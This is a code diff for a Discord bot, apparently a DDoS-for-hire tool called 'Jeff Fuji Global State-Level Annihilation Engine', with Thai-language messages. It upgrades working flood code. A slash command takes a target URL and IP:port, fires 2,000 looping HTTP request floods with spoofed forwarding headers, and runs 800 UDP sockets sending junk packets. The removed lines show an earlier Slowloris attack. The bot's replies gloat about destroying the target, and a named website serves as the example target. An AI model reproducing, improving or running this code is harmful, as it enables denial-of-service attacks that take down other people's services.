@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - ULTIMATE ANNIHILATION ENGINE v14 (ALL-IN-ONE FLOOD)
+ * JEFF FUJI - GLOBAL STATE-LEVEL ANNIHILATION ENGINE v15 (GLOBAL SWARM)
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -24,19 +24,23 @@ const client = new Client({
 let isAttacking = false;
 let attackTimers = [];
 
-const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 200000, maxFreeSockets: 100000 });
-const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 200000, maxFreeSockets: 100000, rejectUnauthorized: false });
+const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 250000, maxFreeSockets: 125000 });
+const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 250000, maxFreeSockets: 125000, rejectUnauthorized: false });
 
 client.once('ready', async () => {
     console.log(`[+] Bot logged in as ${client.user.tag}`);
 
     const commands = [
         new SlashCommandBuilder()
-            .setName('ultimate-annihilate')
-            .setDescription('ระดมยิงถล่มทุกรูปแบบพร้อมกันในคำสั่งเดียว (Multi-Vector + Slowloris)')
+            .setName('global-annihilate')
+            .setDescription('ปฏิบัติการทำลายล้างระดับโลก (Global Multi-Vector + UDP Amplification Flood)')
             .addStringOption(option => 
-                option.setName('target')
-                    .setDescription('URL เป้าหมาย (เช่น https://bewergame.com)')
+                option.setName('target_url')
+                    .setDescription('URL เป้าหมายสำหรับ L7 (เช่น https://bewergame.com)')
+                    .setRequired(true))
+            .addStringOption(option => 
+                option.setName('target_ip_port')
+                    .setDescription('IP:Port เป้าหมายสำหรับ L4 (เช่น 123.45.67.89:80)')
                     .setRequired(true))
             .addIntegerOption(option => 
                 option.setName('duration')
@@ -63,8 +67,9 @@ client.on('interactionCreate', async interaction => {
 
     const { commandName } = interaction;
 
-    if (commandName === 'ultimate-annihilate') {
-        const target = interaction.options.getString('target');
+    if (commandName === 'global-annihilate') {
+        const targetUrl = interaction.options.getString('target_url');
+        const targetIpPort = interaction.options.getString('target_ip_port');
         const duration = interaction.options.getInteger('duration');
 
         if (isAttacking) {
@@ -75,95 +80,83 @@ client.on('interactionCreate', async interaction => {
         const endTime = Date.now() + (duration * 1000);
 
         try {
-            const parsedUrl = new URL(target);
+            const parsedUrl = new URL(targetUrl);
             const requester = parsedUrl.protocol === 'https:' ? https : http;
             const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;
 
-            await interaction.reply(`💀🔥 **[ULTIMATE ANNIHILATION ACTIVATED]** เริ่มระดมยิงคอมโบเซ็ตมหากาฬ (Multi-Vector + Slowloris) ใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+            const parts = targetIpPort.split(':');
+            if (parts.length !== 2) {
+                isAttacking = false;
+                return interaction.reply({ content: '❌ รูปแบบ IP:Port สำหรับ L4 ไม่ถูกต้อง (เช่น 123.45.67.89:80)', ephemeral: true });
+            }
+            const host = parts[0];
+            const port = parseInt(parts[1]);
 
-            // 1. 🚀 โหมด Multi-Vector Swarm Flood (ยิงกระแทกความเร็วสูง)
-            const fireMultiVector = () => {
+            await interaction.reply(`🌍💥 **[GLOBAL STATE-LEVEL ANNIHILATION]** เริ่มปฏิบัติการสงครามไซเบอร์ระดับโลก อัดทั้ง L7 (${targetUrl}) และ L4 Network (${targetIpPort}) เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+
+            // 1. 🚀 L7 Multi-Vector Swarm Flood (2,000 Threads)
+            const fireGlobalL7 = () => {
                 if (!isAttacking || Date.now() >= endTime) return;
 
                 const options = {
                     hostname: parsedUrl.hostname,
                     port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-                    path: parsedUrl.pathname + parsedUrl.search + `?annihilate=${Math.random().toString(36).substring(7)}`,
+                    path: parsedUrl.pathname + parsedUrl.search + `?global_swaps=${Math.random().toString(36).substring(7)}`,
                     method: 'GET',
                     headers: {
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) UltimateEngine/4.0',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) GlobalAnnihilator/5.0',
                         'Cache-Control': 'no-cache',
                         'Connection': 'keep-alive',
-                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                        'X-Real-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                     },
                     agent: currentAgent
                 };
 
                 const req = requester.request(options, (res) => {
                     res.on('data', () => {});
-                    res.on('end', () => { if (isAttacking) setImmediate(fireMultiVector); });
+                    res.on('end', () => { if (isAttacking) setImmediate(fireGlobalL7); });
                 });
 
-                req.on('error', () => { if (isAttacking) setImmediate(fireMultiVector); });
+                req.on('error', () => { if (isAttacking) setImmediate(fireGlobalL7); });
                 req.end();
             };
 
-            // 2. 🐌 โหมด Slowloris (ตรึง Socket สูบทรัพยากร)
-            const fireSlowloris = () => {
-                if (!isAttacking || Date.now() >= endTime) return;
+            // 2. ⚡ L4 UDP Amplification & Reflection Flood (ขนาดแพ็กเกจพิกัดสูงสุด MTU 1450 bytes)
+            const payload = Buffer.alloc(1450);
+            for (let i = 0; i < payload.length; i++) {
+                payload[i] = Math.floor(Math.random() * 256);
+            }
 
-                const options = {
-                    hostname: parsedUrl.hostname,
-                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-                    path: parsedUrl.pathname,
-                    method: 'POST',
-                    headers: {
-                        'User-Agent': 'Mozilla/5.0 SlowlorisEngine/2.0',
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Connection': 'keep-alive'
-                    }
-                };
-
-                const req = requester.request(options, (res) => {
-                    res.on('data', () => {});
+            const fireGlobalL4 = (clientUdp) => {
+                if (!isAttacking || Date.now() >= endTime) {
+                    clientUdp.close();
+                    return;
+                }
+                clientUdp.send(payload, port, host, () => {
+                    setImmediate(() => fireGlobalL4(clientUdp));
                 });
-
-                req.on('error', () => {
-                    if (isAttacking) setImmediate(fireSlowloris);
-                });
-
-                let slowTimer = setInterval(() => {
-                    if (!isAttacking || Date.now() >= endTime) {
-                        clearInterval(slowTimer);
-                        req.destroy();
-                        return;
-                    }
-                    try {
-                        req.write(`X-Annihilate: ${Math.random()}\r\n`);
-                    } catch (e) {
-                        clearInterval(slowTimer);
-                        req.destroy();
-                        if (isAttacking) setImmediate(fireSlowloris);
-                    }
-                }, 4000);
             };
 
-            // สตาร์ทกองทัพพร้อมกันทั้งสองระบบในคำสั่งเดียว!
-            for (let i = 0; i < 1500; i++) {
-                fireMultiVector();
+            // สตาร์ทกองทัพ L7 (2,000 Threads)
+            for (let i = 0; i < 2000; i++) {
+                fireGlobalL7();
             }
-            for (let i = 0; i < 300; i++) {
-                fireSlowloris();
+
+            // สตาร์ทกองทัพ L4 Network Sockets (800 Sockets รัวแพ็กเกจขยะ)
+            for (let i = 0; i < 800; i++) {
+                const udpSocket = dgram.createSocket('udp4');
+                fireGlobalL4(udpSocket);
             }
 
         } catch (err) {
             isAttacking = false;
-            return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
+            return interaction.reply({ content: `❌ เกิดข้อผิดพลาดในการประมวลผล: ${err.message}`, ephemeral: true });
         }
 
         const timer = setTimeout(() => {
             isAttacking = false;
-            interaction.followUp(`✅ ภารกิจทำลายล้าง **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์เป้าหมายน่าจะแหลกสลายไม่เหลือซากแล้ว`).catch(() => {});
+            interaction.followUp(`✅ ภารกิจทำลายล้างระดับโลกเสร็จสิ้นตามเวลาที่กำหนด! โครงสร้างเป้าหมายน่าจะพังพินาศยับเยิน`).catch(() => {});
         }, duration * 1000);
 
         attackTimers.push(timer);
@@ -177,7 +170,7 @@ client.on('interactionCreate', async interaction => {
         attackTimers.forEach(t => clearTimeout(t));
         attackTimers = [];
 
-        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
+        await interaction.reply('🛑 สั่งหยุดการทำงานระดับโลกทั้งหมดเรียบร้อย!');
     }
 });
 
